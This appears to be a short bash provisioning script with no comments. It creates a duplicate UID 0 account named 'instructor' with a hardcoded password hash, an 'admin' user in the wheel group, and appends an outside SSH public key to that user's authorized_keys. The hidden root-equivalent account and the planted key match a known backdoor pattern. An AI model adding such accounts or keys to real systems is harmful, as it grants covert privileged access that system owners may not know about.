#!/bin/bash

useradd -u 0 -o -g 0 instructor
echo 'instructor:$6$VnzpHn111WNDHpAn$9YYfdBRz1VrU06wJ.lbqe2cmwRFaCqUHqeTL7nUdJ9EWL.eVAvRHJ/TBls9n8pdG2HYkvKkDj7aulMo4n55pW0' | chpasswd -e

useradd -u 50000 -g 100 -G wheel -m admin
passwd admin

mkdir -p /home/admin/.ssh
echo "ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABgQCgP2fbcK91zpG9P1PaXFwhSbTjMHHaBG3+AKdYCgC4wG1fnhKDEZaZFnxLwv+t+GTMA/4mFdr7QK53tk5h2zlP6Qr3ERNFZ25zywGuWszTM50U9SH5UOw+M+Lv55Gpc0PvougXNXMKoYUwufiZAG+tZoYXaain3OCGzbFMMbas5YyICUavtwNyBQ7Wz0DmF14cWGvhP4p+r//kX/ybKol1SybR6VZmKkDtWLlI674bluQW1hubjqmYdILfVgvZSC+g3eSoqHvFfShQ7Xd5aoJBT4DGWv6kpl3/muLAKgi+ON3686KX2Un0erUIVl4dYSRCPSXUZe6uidJoJ/STFzZBYFjwsiTo4XOfIj/2A46TSFCeIYESN7f6kGNz+CB9V0B+v500HkTj7XUdgbMkGJEfBbm89/gjUDsI9Rq7zJI2wAnz6ritWOh+Awgj2ZOBUiNnUP4xxk8yIIZt+8aM+inPLXSCZP+uF9NZKN+SGOJVJikx38ecu5K42QtbLd1JNyE= naimols@fang" >> /home/admin/.ssh/authorized_keys
